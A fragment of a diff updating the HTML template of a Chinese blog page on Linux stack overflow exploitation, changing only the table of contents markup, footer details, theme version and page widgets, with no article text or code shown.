nav-level-2"><a class="nav-link" href="#%E9%80%90%E5%AD%97%E8%8A%82%E7%88%86%E7%A0%B4"><span class="nav-text">逐字节爆破</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8A%AB%E6%8C%81-__stack_chk_failed-%E5%87%BD%E6%95%B0"><span class="nav-text">劫持 __stack_chk_failed 函数</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%A9%E7%94%A8-__stack_chk_failed-%E5%87%BD%E6%95%B0%E6%8A%A5%E9%94%99%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%95%B0%E6%8D%AE"><span class="nav-text">利用
+	
+	<div class="toc-content-container">
+		<div class="post-toc-wrap">
+	<div class="post-toc">
+		<div class="toc-title">On this page</div>
+		<div class="page-title">linux 栈溢出</div>
+		<ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E"><span class="nav-text">逻辑漏洞</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#ret2text"><span class="nav-text">ret2text</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#ret2shellcode"><span class="nav-text">ret2shellcode</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%89%8B%E5%86%99"><span class="nav-text">手写</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#pwntools-%E7%94%9F%E6%88%90"><span class="nav-text">pwntools 生成</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%BA%AF-ascii-%E7%A0%81-shellcode"><span class="nav-text">纯 ascii 码 shellcode</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#x00-%E6%88%AA%E6%96%AD"><span class="nav-text">\x00 截断</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B5%8B%E8%AF%95-shellcode"><span class="nav-text">测试 shellcode</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#ret2syscall"><span class="nav-text">ret2syscall</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BD%8D"><span class="nav-text">32位</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BD%8D-1"><span class="nav-text">64位</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#ret2libc"><span class="nav-text">ret2libc</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#linux%E5%BB%B6%E8%BF%9F%E7%BB%91%E5%AE%9A%E6%9C%BA%E5%88%B6"><span class="nav-text">linux延迟绑定机制</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E8%BF%87%E7%A8%8B"><span class="nav-text">利用过程</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%B3%84%E9%9C%B2%E5%87%BD%E6%95%B0%E5%9C%B0%E5%9D%80"><span class="nav-text">泄露函数地址</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#canary-%E7%BB%95%E8%BF%87"><span class="nav-text">canary 绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B3%84%E9%9C%B2canary"><span class="nav-text">泄露canary</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%80%90%E5%AD%97%E8%8A%82%E7%88%86%E7%A0%B4"><span class="nav-text">逐字节爆破</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8A%AB%E6%8C%81-__stack_chk_failed-%E5%87%BD%E6%95%B0"><span class="nav-text">劫持 __stack_chk_failed 函数</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%A9%E7%94%A8-__stack_chk_failed-%E5%87%BD%E6%95%B0%E6%8A%A5%E9%94%99%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%95%B0%E6%8D%AE"><span class="nav-text">利用
 __stack_chk_failed 函数报错信息泄露数据</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%A6%86%E7%9B%96-canary-%E5%88%9D%E5%A7%8B%E5%80%BC"><span class="nav-text">覆盖 canary 初始值</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%B2%99%E7%AE%B1%E7%BB%95%E8%BF%87"><span class="nav-text">沙箱绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5"><span class="nav-text">基本概念</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8-prctl-%E5%88%9B%E5%BB%BA-seccomp"><span class="nav-text">使用 prctl 创建 seccomp</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8-seccomp-%E5%88%9B%E5%BB%BA-seccomp"><span class="nav-text">使用 seccomp 创建 seccomp</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95"><span class="nav-text">绕过方法</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#orw"><span class="nav-text">orw</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8%E5%8A%9F%E8%83%BD%E7%9B%B8%E4%BC%BC%E7%9A%84%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E6%9B%BF%E4%BB%A3"><span class="nav-text">使用功能相似的系统调用替代</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8-4-%E5%AD%97%E8%8A%82%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E5%8F%B7%E7%BB%95%E8%BF%87"><span class="nav-text">使用 4 字节系统调用号绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8-32-%E4%BD%8D-shellcode-%E7%BB%95%E8%BF%87"><span class="nav-text">使用 32 位 shellcode 绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8-shellcode-%E4%BE%A7%E4%BF%A1%E9%81%93%E7%88%86%E7%A0%B4-flag"><span class="nav-text">使用 shellcode 侧信道爆破
 flag</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8-close-%E7%BB%95%E8%BF%87-fd-%E5%8F%82%E6%95%B0%E6%A3%80%E6%9F%A5"><span class="nav-text">使用 close 绕过 fd 参数检查</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%A0%88%E8%BF%81%E7%A7%BB"><span class="nav-text">栈迁移</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%A0%88%E8%BF%81%E7%A7%BB%E5%88%B0%E6%95%B0%E6%8D%AE%E5%A1%AB%E5%85%85%E6%AE%B5"><span class="nav-text">栈迁移到数据填充段</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%A0%88%E8%BF%81%E7%A7%BB%E5%88%B0%E5%85%B6%E5%AE%83%E7%A9%BA%E9%97%B2%E5%9C%B0%E5%9D%80"><span class="nav-text">栈迁移到其它空闲地址</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#ret2csu"><span class="nav-text">ret2csu</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#ret2dlresolve"><span class="nav-text">ret2dlresolve</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%9B%B8%E5%85%B3%E7%BB%93%E6%9E%84"><span class="nav-text">相关结构</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#dyn"><span class="nav-text">Dyn</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#sym"><span class="nav-text">Sym</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#rel"><span class="nav-text">Rel</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#link_map"><span class="nav-text">link_map</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#dl_runtime_resolve-%E5%87%BD%E6%95%B0"><span class="nav-text">_dl_runtime_resolve 函数</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BD%8D-ret2dlresolve"><span class="nav-text">32 位 ret2dlresolve</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%94%B9%E5%86%99-.dynamic-%E7%9A%84-dt_strtab"><span class="nav-text">改写 .dynamic 的 DT_STRTAB</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%93%8D%E7%BA%B5%E7%AC%AC%E4%BA%8C%E4%B8%AA%E5%8F%82%E6%95%B0%E4%BD%BF%E5%85%B6%E6%8C%87%E5%90%91%E6%88%91%E4%BB%AC%E6%89%80%E6%9E%84%E9%80%A0%E7%9A%84-elf32_rel"><span class="nav-text">操纵第二个参数，使其指向我们所构造的
 Elf32_Rel</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BD%8D-ret2dlresolve-1"><span class="nav-text">64 位 ret2dlresolve</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#srop"><span class="nav-text">SROP</span></a></li></ol>
 
-    </div>
+	</div>
 </div>
-        </div>
-    
+	</div>
+	
 </div>
+			</div>
 
+			
+		</div>
 
-
-                
-
-            </div>
-
-            
-
-        </div>
-
-        <div class="main-content-footer">
-            <footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
+		<div class="main-content-footer">
+			<footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
     <div class="info-container py-3 text-center">
         
         <div class="text-center">
             &copy;
             
-              <span>2022</span>
+              <span>2024</span>
               -
             
             2024&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">sky123</a>
@@ -1338,7 +1393,7 @@ Elf32_Rel</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="na
                     </span>
                     
                         <span>
-                            380.2k words in total
+                            379.8k words in total
                         </span>
                     
                 </p>
@@ -1363,7 +1418,7 @@ Elf32_Rel</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="na
         
         <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
             <span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span>
-            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.7.3</a></span>
+            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.8.0</a></span>
         </div>
         
         
@@ -1392,113 +1447,102 @@ Elf32_Rel</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="na
         
     </div>  
 </footer>
-        </div>
-    </div>
+		</div>
+	</div>
 
-    
-        <div class="post-tools">
-            <div class="post-tools-container">
-    <ul class="article-tools-list">
-        <!-- TOC aside toggle -->
-        
-            <li class="right-bottom-tools page-aside-toggle">
-                <i class="fa-regular fa-outdent"></i>
-            </li>
-        
+	
+	<div class="post-tools">
+		<div class="post-tools-container">
+	<ul class="article-tools-list">
+		<!-- TOC aside toggle -->
+		
+		<li class="right-bottom-tools page-aside-toggle">
+			<i class="fa-regular fa-outdent"></i>
+		</li>
+		
 
-        <!-- go comment -->
-        
-            <li class="go-comment">
-                <i class="fa-regular fa-comments"></i>
-            </li>
-        
-    </ul>
+		<!-- go comment -->
+		
+		<li class="go-comment">
+			<i class="fa-regular fa-comments"></i>
+		</li>
+		
+	</ul>
+</div>
+	</div>
+	
+
+	<div class="right-side-tools-container">
+		<div class="side-tools-container">
+	<ul class="hidden-tools-list">
+		<li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
+			<i class="fa-regular fa-magnifying-glass-plus"></i>
+		</li>
+
+		<li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
+			<i class="fa-regular fa-magnifying-glass-minus"></i>
+		</li>
+
+		<li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
+			<i class="fa-regular fa-moon"></i>
+		</li>
+
+		<!-- rss -->
+		
+
+		
+
+		<li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
+			<i class="fa-regular fa-arrow-down"></i>
+		</li>
+	</ul>
+
+	<ul class="visible-tools-list">
+		<li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
+			<i class="fa-regular fa-cog fa-spin"></i>
+		</li>
+		
+		<li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
+			<i class="arrow-up fas fa-arrow-up"></i>
+			<span class="percent"></span>
+		</li>
+		
+		
+	</ul>
+</div>
+	</div>
+
+	<div class="image-viewer-container">
+	<img src="">
 </div>
 
-        </div>
-    
-
-    <div class="right-side-tools-container">
-        <div class="side-tools-container">
-    <ul class="hidden-tools-list">
-        <li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
-            <i class="fa-regular fa-magnifying-glass-plus"></i>
-        </li>
-
-        <li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
-            <i class="fa-regular fa-magnifying-glass-minus"></i>
-        </li>
-
-        <li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
-            <i class="fa-regular fa-moon"></i>
-        </li>
-
-        <!-- rss -->
-        
-
-        
-
-        <li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
-            <i class="fa-regular fa-arrow-down"></i>
-        </li>
-    </ul>
-
-    <ul class="visible-tools-list">
-        <li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
-            <i class="fa-regular fa-cog fa-spin"></i>
-        </li>
-        
-            <li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
-                <i class="arrow-up fas fa-arrow-up"></i>
-                <span class="percent"></span>
-            </li>
-        
-        
-    </ul>
+	
+	<div class="search-pop-overlay">
+	<div class="popup search-popup">
+		<div class="search-header">
+			<span class="search-input-field-pre">
+				<i class="fa-solid fa-keyboard"></i>
+			</span>
+			<div class="search-input-container">
+				<input autocomplete="off" autocorrect="off" autocapitalize="off" placeholder="Search..." spellcheck="false" type="search" class="search-input">
+			</div>
+			<span class="popup-btn-close">
+				<i class="fa-solid fa-times"></i>
+			</span>
+		</div>
+		<div id="search-result">
+			<div id="no-result">
+				<i class="fa-solid fa-spinner fa-spin-pulse fa-5x fa-fw"></i>
+			</div>
+		</div>
+	</div>
 </div>
-
-    </div>
-
-    <div class="image-viewer-container">
-    <img src="">
-</div>
-
-
-    
-        <div class="search-pop-overlay">
-    <div class="popup search-popup">
-        <div class="search-header">
-          <span class="search-input-field-pre">
-            <i class="fa-solid fa-keyboard"></i>
-          </span>
-            <div class="search-input-container">
-                <input autocomplete="off"
-                       autocorrect="off"
-                       autocapitalize="off"
-                       placeholder="Search..."
-                       spellcheck="false"
-                       type="search"
-                       class="search-input"
-                >
-            </div>
-            <span class="popup-btn-close">
-                <i class="fa-solid fa-times"></i>
-            </span>
-        </div>
-        <div id="search-result">
-            <div id="no-result">
-                <i class="fa-solid fa-spinner fa-spin-pulse fa-5x fa-fw"></i>
-            </div>
-        </div>
-    </div>
-</div>
-
-    
+	
 
 </main>
 
 
-    
+
 <script src="/js/libs/Swup.min.js"></script>
 
 <script src="/js/libs/SwupSlideTheme.min.js"></script>
@@ -1533,9 +1577,7 @@ Elf32_Rel</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="na
 
 
 
-
-
-
+	
 <script src="/js/tools/imageViewer.js" type="module"></script>
 
 <script src="/js/utils.js" type="module"></script>
@@ -1627,5 +1669,8 @@ Elf32_Rel</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="na
 
 
 
+
+	
 </body>
+
 </html>
